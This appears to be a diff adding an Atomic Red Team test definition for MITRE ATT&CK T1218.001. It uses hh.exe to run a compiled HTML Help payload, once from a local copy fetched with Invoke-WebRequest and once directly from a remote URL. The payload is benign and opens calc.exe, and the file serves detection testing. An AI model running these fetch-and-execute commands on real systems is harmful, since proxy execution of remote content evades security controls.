@@ -1,0 +1,44 @@
+attack_technique:
+- T1218.001
+display_name: Compiled HTML File
+atomic_tests:
+- name: Compiled HTML Help Local Payload
+  description: |
+    Uses hh.exe to execute a local compiled HTML Help payload.
+    Upon execution calc.exe will open
+  supported_platforms:
+  - windows
+  input_arguments:
+    local_chm_file:
+      description: Local .chm payload
+      type: path
+      default: PathToAtomicsFolder\T1223\src\T1223.chm
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The payload must exist on disk at specified location (#{local_chm_file})
+    prereq_command: |
+      if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1223/src/T1223.chm" -OutFile "#{local_chm_file}"
+  executor:
+    command: |
+      hh.exe #{local_chm_file}
+    name: command_prompt
+- name: Compiled HTML Help Remote Payload
+  description: |
+    Uses hh.exe to execute a remote compiled HTML Help payload.
+    Upon execution displays an error saying the file cannot be open
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_chm_file:
+      description: Remote .chm payload
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+  executor:
+    command: |
+      hh.exe #{remote_chm_file}
+    name: command_prompt
+
